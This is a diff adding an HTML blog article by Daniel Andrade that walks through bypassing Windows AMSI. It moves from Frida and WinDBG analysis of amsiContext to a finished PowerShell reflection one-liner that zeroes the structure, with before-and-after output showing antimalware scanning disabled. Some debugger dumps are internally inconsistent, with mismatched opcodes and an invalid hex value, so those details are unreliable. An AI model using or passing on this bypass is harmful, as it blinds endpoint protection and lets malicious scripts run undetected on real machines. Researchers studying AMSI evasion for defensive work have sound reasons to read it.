@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8" />
+    <link href="styles/style.css" rel="stylesheet" />
+    <title>AMSI bypass — dinvoke</title>
+    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon" />
+    <link
+      href="https://fonts.googleapis.com/css?family=Playfair+Display+SC"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css?family=Linden+Hill"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css?family=Cormorant"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css?family=Cinzel"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <header class="page-header">
+      <h1 class="page-title"><a href="articles.html">AMSI bypass</a></h1>
+      <p class="page-sub">MMXXVI ✧ III</p>
+    </header>
+
+    <article class="article-page">
+      <p class="about-sub">✧ ✧ ✧</p>
+
+<p>AMSI (Antimalware Scan Interface) is a Windows security feature that allows applications and services to integrate with any antimalware product installed on a machine. It provides a standard interface for scanning content like scripts, macros, and memory buffers before execution. AMSI is primarily used by PowerShell, Windows Script Host, JavaScript, and VBScript to detect malicious code at runtime. Security products hook into AMSI to inspect potentially dangerous content and block threats before they can execute.</p>
+<p>Any antivirus can use this interface to extend its protection to these functionalities.</p>
+<pre><code> 
+                ┌────────────┐    ┌──────────┐   ┌─────────────┐     ┌─────────────┐
+                │ Powershell │    │ VBScript │   │   Other     │     │   Other     │
+                │            │    │          │   │ Application │     │ Application │
+                └─────▲──────┘    └────▲─────┘   └──────▲──────┘     └──────▲──────┘
+                      │                │                │                   │
+               ───────┼────────────────┼────────────────┼───────────────────┼─────────────
+               ┌──────▼────────────────▼────────────────▼────────┐
+               │          AMSI.h + AMSI.lib + AMSI.dll           │
+               │                                                 │
+Win32 Api Layer│   AmsiScanBuffer()                              │
+               │   AmsiScanString()                              │
+               └─────────────────────────────────────────────────┘
+               ─────────────────────────────────────────────────────────────────────────
+               ┌────────────────────────────────────────────────────────────────────────┐
+               │                                              ┌─────────────┐           │
+               │                  AMSI.h + AMSI.dll           │ Provider    │           │
+COM API Layer  │                IAntimalware::Scan()           │ Class       │           │
+               │                                              │ Registration│           │
+               │                                              └─────────────┘           │
+               └────────────────────────────────────────────────────────────────────────┘
+               ────────────────────────────────────────────────────────────────────────
+               ┌───────────────────────────────────┐         ┌──────────────────────────┐
+               │   Windows Defender Provider Class │         │ 3rd Party AV Provider    │
+AV Provider    │   IAntimalwareProvider::Scan()    │         │       Class              │
+Layer          │                                   │         │                          │
+               └────────────────────────────────▲──┘         └──────────────────────────┘
+                                                 │
+               ┌────────────────────────────────▼──────────────────────────────────────┐
+               │                               RPC                                     │
+               └────────────────────────────────────────────────────────────────────────┘
+</code></pre>
+<p>To understand how to bypass AMSI, we must also understand the APIs that it exports from its DLL.</p>
+<p>These are the APIs exported from the DLL:</p>
+<ul class="activity-list">
+  <li>AmsiInitialize</li>
+  <li>AmsiOpenSession</li>
+  <li>AmsiScanString</li>
+  <li>AmsiCloseSession</li>
+</ul>
+
+<h3>AmsiInitialize</h3>
+<p>After loading the amsi.dll into the process, this is the first API to be used. It is called before all PowerShell functions, making it impossible to influence its behavior. It receives two parameters: the application name and a pointer to a memory structure that is populated by the API during use.</p>
+<pre><code class="language-c">HRESULT AmsiInitialize(
+    [in]  LPCWSTR        appName,
+    [out] HAMSICONTEXT *amsiContext
+);
+</code></pre>
+<h3>AmsiOpenSession</h3>
+<p>This API is used as soon as AMSI is started with the previous API. It receives a memory structure created previously and also creates a session object, which will be used during the process lifecycle.</p>
+<pre><code class="language-c">HRESULT AmsiOpenSession(
+  [in]  HAMSICONTEXT amsiContext,
+  [out] HAMSISESSION *amsiSession
+);
+</code></pre>
+<h3>AmsiScanString &amp; AmsiScanBuffer</h3>
+<p>AmsiScanString and AmsiScanBuffer capture console input or script content as strings or binary buffers, receiving the previously created structure, the buffer to be scanned, its size, an identifier, the session object, and a pointer to store the result. Windows Defender returns 0 or 1 for clean/not_detected content or 32768 for malicious detection, with AmsiScanString using a string field instead of a buffer. After completion, AmsiCloseSession is called to terminate the session.</p>
+<pre><code class="language-c">HRESULT AmsiScanBuffer(
+  [in]           HAMSICONTEXT amsiContext,
+  [in]           PVOID        buffer,
+  [in]           ULONG        length,
+  [in]           LPCWSTR      contentName,
+  [in, optional] HAMSISESSION amsiSession,
+  [out]          AMSI_RESULT  *result
+);
+</code></pre>
+<p>AMSI creates a structure called amsiContext in the previous APIs, but its internal workings remain undocumented and unclear, suggesting that if we could corrupt or manipulate this structure, we might be able to disrupt or disable the AMSI process entirely.</p>
+<p>We will use Frida to locate the memory address and WinDBG to examine this structure, demonstrating that corrupting the beginning of AmsiContext successfully disables AMSI. We start by hooking the amsi.dll APIs to obtain the amsiContext memory address.</p>
+<pre><code>frida-trace -p powershell-pid -x amsi.dll -i Amsi*
+</code></pre>
+<p>After that, Frida is already tracing our PowerShell process, so if we insert anything into PowerShell it will be captured. I type the famous 'amsiUtils' string which already has a signature, so AMSI detects it as malware.</p>
+<pre><code>11280 ms AmsiOpenSession()
+11280 ms [*] AmsiScanBuffer()
+11280 ms |- amsiContext: 0x192832bd1b0
+11280 ms |- buffer: 'amsiUtils'
+11280 ms |- length: 0x16
+11280 ms |- contentName 0x187000014c
+11280 ms |- amsiSession 0x6dce
+11280 ms |- result 0x64cv34e760
+
+11280 ms [*] AmsiScanBuffer() Exit
+11280 ms |- Result Value is: 32768
+</code></pre>
+<p>The amsiContext is a structure whose memory address remains constant while the PowerShell process is active, meaning any modifications we make to this structure persist throughout the process lifetime. Now we move to WinDBG to analyze how this structure behaves and perform the bypass by attaching WinDBG to the PowerShell process.</p>
+<p>First, we dump the existing content inside this structure:</p>
+<pre><code>dc 0x192832bd1b0
+
+00000192  832bd1b0  49534d41  00000000  735a3b60  00000185   AMSI.....`Zs....
+00000192  832bd1c0  7178e0f0  00000185  00006ad0  00000000   ..xq......m.......
+00000192  832bd1d0  00000000  00000000  35fa6a1a  8f000185   ..........j.5.....
+00000192  832bd1e0  211c0500  6d8ade20  000007fe  8ace8021   ..!...m.....!.....
+00000192  832bd1b0  007ffa6d  70002100  7ffa717a  1c1c0000   m.....l.pzq.......
+00000192  832bd1b0  00000000  00000000  35c7dae7  90000a00   ..........5.......
+00000192  832bd1b0  6c6c6143  65746953  7261545e  00746567   CallSite.Target...
+00000192  832bd1b0  00000014  00000000  00000000  00000000   ..................
+</code></pre>
+<p>The first 4 bytes are fixed, which means this string is static across processes.</p>
+<p>We don't know how this string is used, but according to the API documentation, it is an argument for the AmsiOpenSession API.</p>
+<pre><code class="language-c">HRESULT AmsiOpenSession(
+  [in]  HAMSICONTEXT amsiContext,
+  [out] HAMSISESSION *amsiSession
+);
+</code></pre>
+<p>We can see how this API behaves by doing the disassembly.</p>
+<pre><code>u amsi!AmsiOpenSession
+
+00007ffa`95d53560 e9a3cb380f                    jmp     00007ffa`a50e0108
+00007ffa`95d53565 488b03c0                      test    rcx,rcx
+00007ffa`95d53568 7442                          je      amsi!AmsiOpenSession+0x4c (00007ffa`95d535ac)
+00007ffa`95d5356a 8b139414d5349                 cmp     dword ptr [rcx+14h],49534D41h
+00007ffa`95d53570 75ca                          jne     amsi!AmsiOpenSession+0x4c (00007ffa`95d535ac)
+00007ffa`95d53572 4883790800                    cmp     qword ptr [rcx+8],0
+00007ffa`95d53577 7433                          je      amsi!AmsiOpenSession+0x4c (00007ffa`95d535ac)
+00007ffa`95d53579 4883791000                    cmp     qword ptr [rcx+10h],0
+</code></pre>
+<p>The AMSI string is being compared with some value inside RCX. In 64-bit assembly, RCX holds the value of the first function argument, which in this case is exactly the amsiContext. This means we are comparing the buffer header with the string. If the string is not equal to AMSI, we jump to the JNE instruction. We can type the command to see the assembly.</p>
+<pre><code>u amsi!AmsiOpenSession+0x4b L2
+
+amsi!AmsiOpenSession+0x4b:
+00007ffa`95d535ab cc                            int     3
+00007ffa`95d535ac b857000780                    mov     eax,80070057h
+</code></pre>
+<p>A value is placed in EAX and the function returns, since in both 32-bit and 64-bit assembly, function return values are stored in EAX. The function returns an HRESULT type. We can check the Microsoft documentation to verify what this result value 80070057 means.</p>
+<pre><code>┌────────────┬───────────────────────────────────────────┐
+│ LOVEAMSI   │                                      ─  X │
+│┌───────────┴──────────────────────────────────────────┐│
+││https://learn.microsoft.com/en-us/openspecs/windows_..││
+│└──────────────────────────────────────────────────────┘│
+│                                                        │
+│  ┌───────────────────────────────────┬─────────────┐   │
+│  │ Daniel is beautiful.              │its true.    │   │
+│  └───────────────────────────────────┴─────────────┘   │
+│  ┌───────────────────────────────────┬──────────────┐  │
+│  │                                   │              │  │
+│  │  0x80070057                       │One or more   │  │
+│  │                                   │arguments are │  │
+│  │  E_INVALIDARG                     │invalid       │  │
+│  │                                   │              │  │
+│  └───────────────────────────────────┴──────────────┘  │
+│  ┌──────────────────────────────────────────────────┐  │
+│  │ I LOVE AMSI BYPASS                               │  │
+│  └──────────────────────────────────────────────────┘  │
+└────────────────────────────────────────────────────────┘
+</code></pre>
+<p>The function returns an invalid argument value and terminates execution. Since we don't know what will happen if we corrupt this structure, we can test it and observe the results.</p>
+<p>To force this error, we first set a bp (breakpoint) on the function.</p>
+<pre><code>bp amsi!AmsiOpenSession
+</code></pre>
+<p>Right after that, we resume execution.</p>
+<pre><code>g
+</code></pre>
+<p>Then we send, for example, the string that AMSI flags, 'amsiUtils'. Right after that, the breakpoint is triggered.</p>
+<pre><code>00007ffa`95d53551 cc                            int     3
+00007ffa`95d53552 cc                            int     3
+00007ffa`95d53553 cc                            int     3
+00007ffa`95d53554 cc                            int     3
+00007ffa`95d53555 cc                            int     3
+00007ffa`95d53556 cc                            int     3
+00007ffa`95d53557 cc                            int     3
+00007ffa`95d53558 cc                            int     3
+00007ffa`95d53559 cc                            int     3
+00007ffa`95d5355a cc                            int     3
+00007ffa`95d5355b cc                            int     3
+00007ffa`95d5355c cc                            int     3
+00007ffa`95d5355d cc                            int     3
+00007ffa`95d5355e cc                            int     3
+00007ffa`95d5355f cc                            int     3
+amsi!AmsiOpenSession:
+00007ffa`95d53560 e9a3cb380f                    jmp     00007ffa`a50e0108   // &lt;-- bp stopped here
+00007ffa`95d53565 4885c9                        test    rcx,rcx
+00007ffa`95d53568 7442                          je      amsi!AmsiOpenSession+0x4c (00007ffa`95d535ac)
+00007ffa`95d5356a 8139414d5349                  cmp     dword ptr [rcx],49534D41h
+00007ffa`95d53570 753a                          jne     amsi!AmsiOpenSession+0x4c (00007ffa`95d535ac)
+00007ffa`95d53572 4883790800                    cmp     qword ptr [rcx+8],0
+00007ffa`95d53577 7433                          je      amsi!AmsiOpenSession+0x4c (00007ffa`95d535ac)
+00007ffa`95d53579 4883791000                    cmp     qword ptr [rcx+10h],0
+00007ffa`95d5357e 742c                          je      amsi!AmsiOpenSession+0x4c (00007ffa`95d535ac)
+00007ffa`95d53580 41b801000000                  mov     r8d,1
+00007ffa`95d53586 418bc0                        mov     eax,r8d
+00007ffa`95d53589 f00fc14118                    lock xadd dword ptr [rcx+18h],eax
+</code></pre>
+<p>Now using the WinDBG 'ed' command, we write to the memory address and erase the header where AMSI is written.</p>
+<pre><code>dc rcx L1
+ed rcx 0
+dc rcx L1
+
+0:008&gt; dc rcx L1
+00000192`832bd1b0  49534d41                                    AMSI
+
+0:008&gt; ed RCX 0
+
+0:008&gt; dc rcx L1
+00000192`832bd1b0  00000000                                    ....
+</code></pre>
+<p>As a result, after generating the error, we successfully corrupt AMSI and execute the string without any blocks.</p>
+<p><strong>Before Bypass:</strong></p>
+<pre><code>PS C:\Users\narcist&gt; 'amsiUtils'
+At line:1 char:1
++ amsiUtils
++ ~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+</code></pre>
+<p><strong>After bypass:</strong></p>
+<pre><code>PS C:\Users\narcist&gt; 'amsiUtils'
+amsiUtils
+</code></pre>
+<h2 class="article-h2">Creating the bypass with PowerShell</h2>
+<p>PowerShell stores AMSI information internally within a class called System.Management.Automation.AmsiUtils. Since it is an internal method, we can use the Reflection concept to access its methods by first enumerating all data types existing within this class through the GetType method, which is present within a structure called System.Management.Automation.PSReference, or Ref.</p>
+<p>One strategy is to enumerate all data types existing in the PowerShell process.</p>
+<pre><code class="language-powershell">PS C:\Users\narcist&gt; $a=[Ref].Assembly.GetTypes()
+</code></pre>
+<p>Right after that, we can create a for loop that saves only the method we want.</p>
+<pre><code class="language-powershell">PS C:\Users\narcist&gt; Foreach($b in $a) {if ($b.Name -like &quot;*iUtils&quot;) {$b}}
+</code></pre>
+<p>This way we gain access to the method without AMSI alerting. The next step is to enumerate all fields and objects of this class using the GetFields method in PowerShell with the NonPublic and static properties to enumerate structures that aren't instantiated within the class, starting by saving the reference to amsiUtils.</p>
+<pre><code class="language-powershell">PS C:\Users\narcist&gt; Foreach($b in $a) {if ($b.Name -like &quot;*iUtils&quot;) {$c=$b}}
+</code></pre>
+<p>Right after that, we apply GetFields with the mentioned configurations.</p>
+<pre><code class="language-powershell">$c.GetFields('NonPublic,Static')
+</code></pre>
+<p>The first field is what we are looking for.</p>
+<pre><code>PS C:\Users\narcist&gt; $c.GetFields('NonPublic,Static')
+
+Name                    : amsiContext
+MetadataToken           : 67114386
+FieldHandle             : System.RuntimeFieldHandle
+Attributes              : Private, Static
+FieldType               : System.IntPtr
+MemberType              : Field
+ReflectedType           : System.Management.Automation.AmsiUtils
+DeclaringType           : System.Management.Automation.AmsiUtils
+Module                  : System.Management.Automation.dll
+IsPublic                : False
+IsPrivate               : True
+IsFamily                : False
+IsAssembly              : False
+IsFamilyAndAssembly     : False
+IsFamilyOrAssembly      : False
+IsStatic                : True
+IsInitOnly              : False
+IsLiteral               : False
+IsNotSerialized         : False
+IsSpecialName           : False
+IsPinvokeImpl           : False
+IsSecurityCritical      : True
+IsSecuritySafeCritical  : False
+IsSecurityTransparent   : False
+CustomAttributes        : {}
+</code></pre>
+<p>We can access this method, which is exactly what we need to bypass AMSI, but the only problem is that if we put this string in the command, AMSI also flags it as malicious since the 'amsi' string is detected. However, we can use the same technique as before to get a reference to this field by enumerating all fields.</p>
+<pre><code class="language-powershell">PS C:\Users\narcist&gt; $d=$c.GetFields('NonPublic,Static')
+</code></pre>
+<p>We use a for loop to save only the desired one.</p>
+<pre><code class="language-powershell">PS C:\Users\narcist&gt; Foreach($e in $d) {if ($e.Name -like &quot;*Context&quot;) {$f=$e}}
+</code></pre>
+<p>This way, we save a reference to this object.</p>
+<pre><code>PS C:\Users\narcist&gt; $f
+
+Name                    : amsiContext
+MetadataToken           : 67114386
+FieldHandle             : System.RuntimeFieldHandle
+Attributes              : Private, Static
+FieldType               : System.IntPtr
+MemberType              : Field
+ReflectedType           : System.Management.Automation.AmsiUtils
+DeclaringType           : System.Management.Automation.AmsiUtils
+Module                  : System.Management.Automation.dll
+IsPublic                : False
+IsPrivate               : True
+IsFamily                : False
+IsAssembly              : False
+IsFamilyAndAssembly     : False
+IsFamilyOrAssembly      : False
+IsStatic                : True
+IsInitOnly              : False
+IsLiteral               : False
+IsNotSerialized         : False
+IsSpecialName           : False
+IsPinvokeImpl           : False
+IsSecurityCritical      : True
+IsSecuritySafeCritical  : False
+IsSecurityTransparent   : False
+CustomAttributes        : {}
+</code></pre>
+<p>We can check the content with the command.</p>
+<pre><code class="language-powershell">PS C:\Users\narcist&gt; $f.GetValue($null)
+
+1563745672608
+</code></pre>
+<p>To confirm that this number is really what we are looking for, we convert it to hexadecimal, which in my case is 0x1563745672608. Finally, we need to zero out the structure just like we did in WinDBG, so we save this address in a variable.</p>
+<pre><code class="language-powershell">PS C:\Users\narcist&gt; $g=$f.GetValue($null)
+</code></pre>
+<p>We create a pointer to access the memory address content.</p>
+<pre><code class="language-powershell">PS C:\Users\narcist&gt; [IntPtr]$ptr=$g
+</code></pre>
+<p>Then we create a variable with the content 0.</p>
+<pre><code class="language-powershell">PS C:\Users\narcist&gt; [Int32[]]$buf=@(0)
+</code></pre>
+<p>Finally, we copy the value to the pointer with the Copy function.</p>
+<pre><code class="language-powershell">PS C:\Users\narcist&gt; [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+</code></pre>
+<p>Putting all of this into one line, we have the following bypass.</p>
+<pre><code class="language-powershell">$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like &quot;*iUtils&quot;) {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like &quot;*Context&quot;) {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+</code></pre>
+<pre><code>PS C:\Users\narcist&gt; 'amsiUtils'
+At line:1 char:1
++ amsiUtils
++ ~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+PS C:\Users\narcist&gt; $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like &quot;*iUtils&quot;) {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like &quot;*Context&quot;) {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+PS C:\Users\narcist&gt; 'amsiUtils'
+amsiUtils
+</code></pre>
+<p>I Love Jesus.
+Made by Daniel Andrade.</p>
+
+      <a href="articles.html" class="about-back">✧ Return</a>
+    </article>
+  </body>
+</html>
